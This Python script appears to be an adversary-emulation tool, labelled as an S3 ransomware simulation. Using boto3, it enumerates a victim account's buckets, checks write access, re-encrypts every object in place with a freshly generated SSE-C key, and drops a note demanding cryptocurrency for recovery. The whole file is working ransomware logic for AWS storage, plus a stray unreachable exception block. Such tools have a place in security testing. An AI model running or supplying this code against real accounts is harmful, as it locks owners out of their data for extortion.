import boto3
import os
import argparse
from botocore.config import Config
from botocore.exceptions import ClientError
import base64
import hashlib

session_config = Config(
  user_agent_extra=f"s3-ransomware-simulation"
)

s3 = boto3.client('s3', config=session_config)

def generate_aes_key():
    """Generate a random AES-256 key for SSE-C"""
    return os.urandom(32)  # 256 bits

def generate_md5_key(key):
    """Generate MD5 hash of the key for SSE-C (required by S3)"""
    return base64.b64encode(hashlib.md5(key).digest()).decode('utf-8')

def list_s3_buckets():
    """List all S3 buckets in the AWS account"""
    try:
        response = s3.list_buckets()
        return [bucket['Name'] for bucket in response['Buckets']]
    except ClientError as e:
        print(f"Error listing buckets: {e}")
        return []

def check_bucket_permissions(bucket_name):
    """Check if GetObject and PutObject permissions are available on a bucket"""
    test_object_key = 'permission_test_file.txt'
    
    permissions = {
        'GetObject': False,
        'PutObject': False
    }
    
    # Check basic PutObject permission
    try:
        s3.put_object(
            Bucket=bucket_name,
            Key=test_object_key,
            Body=b'test content'
        )
        permissions['PutObject'] = True
        
    except ClientError as e:
        if e.response['Error']['Code'] not in ['403', 'AccessDenied']:
            print(f"Unexpected error testing PutObject on {bucket_name}: {e}")
    
    # Check GetObject permission
    try:
        s3.get_object(Bucket=bucket_name, Key=test_object_key)
        permissions['GetObject'] = True
    except ClientError as e:
        if e.response['Error']['Code'] in ['403', 'AccessDenied']:
            pass  # Expected if no permission
        else:
            print(f"Unexpected error testing GetObject on {bucket_name}: {e}")
    
    except ClientError as e:
        if e.response['Error']['Code'] not in ['403', 'AccessDenied']:
            print(f"Unexpected error listing objects for SSE-C test on {bucket_name}: {e}")
    
    # Clean up if temp file.
    if permissions['PutObject'] == True:
        try:
            s3.delete_object(Bucket=bucket_name, Key=test_object_key)
        except ClientError:
            pass  # Ignore cleanup errors

    return permissions

def encrypt_bucket_contents(bucket_name, encryption_key, key_md5):
    """Encrypt all objects in a bucket using SSE-C with copy_object"""
    s3 = boto3.client('s3')
    processed_files = 0
    
    print(f"\nProcessing bucket: {bucket_name}")
    
    try:
        # List all objects in the bucket
        paginator = s3.get_paginator('list_objects_v2')
        for page in paginator.paginate(Bucket=bucket_name):
            if 'Contents' not in page:
                continue
                
            for obj in page['Contents']:
                key = obj['Key']
                
                try:
                    # Skip directories and already encrypted files
                    if key.endswith('/') or obj.get('Metadata', {}).get('x-amz-meta-encrypted') == 'true':
                        continue
                        
                    print(f"  Encrypting: {key}")
                    
                    # Replace original with encrypted version.
                    s3.copy_object(
                        Bucket=bucket_name,
                        Key=key,
                        CopySource={'Bucket': bucket_name, 'Key': key},
                        SSECustomerAlgorithm='AES256',
                        SSECustomerKey=base64.b64encode(encryption_key).decode(),
                        SSECustomerKeyMD5=key_md5,
                        MetadataDirective='COPY'
                    )
                    
                    processed_files += 1
                    
                except ClientError as e:
                    print(f"    Error processing {key}: {e}")
                except Exception as e:
                    print(f"    Unexpected error processing {key}: {e}")
                    
    except ClientError as e:
        print(f"Error listing objects in bucket {bucket_name}: {e}")
    
    return processed_files

def save_key_to_file(key, filename='encryption_key.bin'):
    """Save the encryption key to a file"""
    with open(filename, 'wb') as f:
        f.write(key)
    print(f"\nEncryption key saved to {filename}")
    print(f"WARNING: This key is required to decrypt your files. Store it securely!")

def drop_ransom_note(bucket_name, object_key="What happened to my files?.txt"):
    """Drops ransom note in the bucket"""
    try:
        s3.put_object(
            Bucket=bucket_name,
            Key=object_key,
            Body=b'All your files were encrypted. Send me a gazillion of the hottest memecoin to my address to get access to the recovery key.'
        )
    except ClientError as e:
        if e.response['Error']['Code'] not in ['403', 'AccessDenied']:
            print(f"Unexpected error dropping ransomware note in {bucket_name}: {e}")
    
def parse_arguments():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(description='S3 Bucket Encryption Tool with SSE-C')
    parser.add_argument('--bucket-name', type=str, help='Specific bucket name to process (cannot be used in combination with --all-buckets)')
    parser.add_argument('--all-buckets', action='store_true', help='Process all buckets in the account (if --bucket-name is not provided)')
    parser.add_argument('--encrypt-objects', action='store_true', help='Encrypt all objects in the specified bucket, or all buckets, using SSE-C')
    return parser.parse_args()

def main():
    args = parse_arguments()
    print("S3 Bucket Encryption Tool with SSE-C")

    # Handle bucket selection
    if args.bucket_name:
        print(f"\nProcessing specified bucket: {args.bucket_name}")
        buckets = [args.bucket_name]
    else:
        if args.all_buckets:
            # List all buckets
            print("\nProcessing all buckets in the account.")
            buckets = list_s3_buckets()
            if not buckets:
                print("No S3 buckets found or unable to list buckets.")
                return
        else:
            print("\nNo bucket specified. Use --bucket-name or --all-buckets.")
            return
    
    # Generate encryption key and MD5
    encryption_key = generate_aes_key()
    # Save the encryption key
    save_key_to_file(encryption_key)
    key_md5 = generate_md5_key(encryption_key)
    print(f"Generated AES-256 encryption key for SSE-C: {base64.b64encode(encryption_key).decode()}")
    print(f"Key MD5: {key_md5}")
    
    # Process each bucket
    total_processed = 0
    for bucket in buckets:
        print(f"\nChecking bucket: {bucket}")
        permissions = check_bucket_permissions(bucket)
        print(f"  GetObject permission: {'Yes' if permissions['GetObject'] else 'No'}")
        print(f"  PutObject permission: {'Yes' if permissions['PutObject'] else 'No'}")
        
        if all(permissions.values()) and args.encrypt_objects:  # Need all permissions to proceed
            processed = encrypt_bucket_contents(bucket, encryption_key, key_md5)
            total_processed += processed
            print(f"  Encrypted {processed} files in {bucket} using SSE-C")

            drop_ransom_note(bucket)
            print(f"  Ransom note dropped in {bucket}.")
        else:
            print("  Skipping bucket - insufficient permissions, SSE-C not supported or flag --encrypt-objects not set.")
    
    print(f"\nEncryption complete. Total files encrypted: {total_processed}")
    print("Warning: Without the encryption key, your files cannot be recovered!")

if __name__ == "__main__":
    main()